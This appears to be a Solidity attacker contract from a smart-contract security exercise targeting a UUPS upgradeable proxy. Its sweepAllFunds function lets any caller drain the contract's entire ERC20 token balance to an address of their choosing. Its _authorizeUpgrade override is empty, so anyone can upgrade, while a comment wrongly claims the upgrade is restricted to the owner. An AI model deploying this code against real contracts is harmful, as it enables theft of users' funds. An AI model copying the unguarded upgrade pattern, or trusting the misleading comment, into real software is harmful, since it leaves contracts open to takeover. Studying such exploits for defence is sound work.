import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract UpgradedAttacker is UUPSUpgradeable {

    function sweepAllFunds(address tokenAddress, address attacker) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(attacker, token.balanceOf(address(this))), "Transfer failed");
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal override {
    }
}
